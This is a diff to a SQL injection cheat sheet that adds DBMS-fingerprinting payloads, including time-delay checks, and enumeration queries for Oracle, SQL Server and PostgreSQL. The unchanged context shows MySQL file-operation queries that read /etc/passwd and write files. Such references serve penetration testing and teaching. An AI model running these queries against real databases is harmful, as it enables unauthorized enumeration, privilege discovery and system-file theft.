@@ -57,19 +57,81 @@ The following queries may be tried to infer the type of **DBMS** being attacked.
 | SELECT POW(1, 1) | Only numeric output is available |          1          |       Error      |
 |  SELECT SLEEP(5) |       Output is not visible      |  0 after 5 seconds  |     No delay     |
 
+#### Oracle
+
+|                          **Payload**                          |          **When to use**         | **Expected output**   | **Wrong output** |
+|:-------------------------------------------------------------:|:--------------------------------:|-----------------------|------------------|
+| SELECT banner FROM v$version; SELECT version FROM v$instance; |  Full query output is available  |      DBMS version     |       Error      |
+|                          BITAND(1, 1)                         | Only numeric output is available |           1           |       Error      |
+|    SELECT dbms_pipe.receive_message((\'a\'), 5) FROM dual;    |       Output is not visible      | \'a\' after 5 seconds |       Error      |
+
+#### Microsoft SQL Server
+
+|        **Payload**        |          **When to use**         | **Expected output** | **Wrong output** |
+|:-------------------------:|:--------------------------------:|---------------------|------------------|
+|      SELECT @@version     |  Full query output is available  |     DBMS version    |       Error      |
+|         SQUARE(1)         | Only numeric output is available |          1          |       Error      |
+| WAITFOR DELAY \'0\:0\:5\' |       Output is not visible      |   5 seconds delay   |       Error      |
+
+#### PostgreSQL
+
+|        **Payload**       |          **When to use**         | **Expected output** | **Wrong output** |
+|:------------------------:|:--------------------------------:|---------------------|------------------|
+|     SELECT version()     |  Full query output is available  |     DBMS version    |       Error      |
+| SELECT 1/(1-pg_sleep(0)) | Only numeric output is available |          1          |       Error      |
+|    SELECT pg_sleep(5)    |       Output is not visible      |   5 seconds delay   |       Error      |
+
 ### Enumeration
 
 #### MySQL
 
-|        **Effect**       |                                                  **Query**                                                  |
-|:-----------------------:|:-----------------------------------------------------------------------------------------------------------:|
-|      List databases     |                             SELECT schema_name FROM information_schema.schemata;                            |
-|  Print current database |                                              SELECT database();                                             |
-|       List tables       |                       SELECT table_schema, table_name FROM information_schema.tables;                       |
+|        **Effect**       |                                                   **Query**                                                   |
+|:-----------------------:|:-------------------------------------------------------------------------------------------------------------:|
+|      List databases     |                              SELECT schema_name FROM information_schema.schemata;                             |
+|  Print current database |                                               SELECT database();                                              |
+|       List tables       |                        SELECT table_schema, table_name FROM information_schema.tables;                        |
 | List columns in a table | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\'; |
-|    Print current user   |                      SELECT user(); SELECT current_user(); SELECT user FROM mysql.user;                     |
+|    Print current user   |                       SELECT user(); SELECT current_user(); SELECT user FROM mysql.user;                      |
 |    Is user superadmin   |                          SELECT super_priv FROM mysql.user WHERE user=\'USER_NAME\';                          |
 |   Dump user privileges  |      SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=\'USER_NAME\';      |
+
+
+### Oracle
+
+|        **Effect**       |                                                            **Query**                                                           |
+|:-----------------------:|:------------------------------------------------------------------------------------------------------------------------------:|
+|      List databases     |                                                               N/A                                                              |
+|  Print current database |                                  SELECT * FROM v$database; SELECT ora_database_name FROM dual;                                 |
+|       List tables       |                                                    SELECT * FROM all_tables;                                                   |
+| List columns in a table |                                SELECT * FROM all_tab_columns WHERE table_name = \'TABLE_NAME\';                                |
+|    Print current user   |                                     SELECT user FROM dual; SELECT username FROM v$session;                                     |
+|    Is user superadmin   | SELECT * FROM SESSION_ROLES WHERE role=\'DBA\'; SELECT * FROM v$pwfile_users WHERE username=\'USER_NAME\' AND SYSDBA=\'TRUE\'; |
+|   Dump user privileges  |                                  SELECT * FROM USER_ROLE_PRIVS; SELECT * FROM USER_SYS_PRIVS;                                  |
+
+
+### Microsoft SQL server
+
+|        **Effect**       |                                                                                                        **Query**                                                                                                       |
+|:-----------------------:|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+|      List databases     |                                                                                             SELECT name FROM sys.databases;                                                                                            |
+|  Print current database |                                                                                                    SELECT db_name();                                                                                                   |
+|       List tables       |                                                                             SELECT table_schema, table_name FROM information_schema.tables;                                                                            |
+| List columns in a table |                                                      SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\';                                                     |
+|    Print current user   |                                                                                                  SELECT current_user;                                                                                                  |
+|    Is user superadmin   |                                                                                         SELECT is_srvrolemember(\'sysadmin\');                                                                                         |
+|   Dump user privileges  | SELECT dp_principal.name, dp.permission_name FROM sys.database_permissions dp JOIN sys.database_principals dp_principals ON dp.grantee_principal_id = dp_principal.principal_id WHERE dp_principal.name=\'USER_NAME\'; |
+
+### PostgreSQL
+
+|        **Effect**       |                                                   **Query**                                                   |
+|:-----------------------:|:-------------------------------------------------------------------------------------------------------------:|
+|      List databases     |                                        SELECT datname FROM pg_database;                                       |
+|  Print current database |                                           SELECT current_database();                                          |
+|       List tables       |                        SELECT table_schema, table_name FROM information_schema.tables;                        |
+| List columns in a table | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\'; |
+|    Print current user   |                                              SELECT current_user;                                             |
+|    Is user superadmin   |                           SELECT rolsuper FROM pg_roles WHERE rolname=\'USER_NAME\';                          |
+|   Dump user privileges  |     SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE grantee=\'USER_NAME\';     |
 
 ### File operations
 
@@ -84,3 +146,14 @@ An empty **secure_file_priv** variable (*i.e.* **\'\'**) allows file operations 
 |             Read file            |                                                                SELECT LOAD_FILE(\'/etc/passwd\');                                                               |
 | Determine secure_file_priv value | SHOW VARIABLES LIKE \'secure_file_priv\'; <br> SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name=\'secure_file_priv\'; |
 |           Write to file          |                                                            SELECT \"Hello World!\" INTO OUTFILE \'/path/to/file\';                                                           |
+
+### Oracle
+
+
+
+### Microsoft SQL server
+
+
+
+### PostgreSQL
+
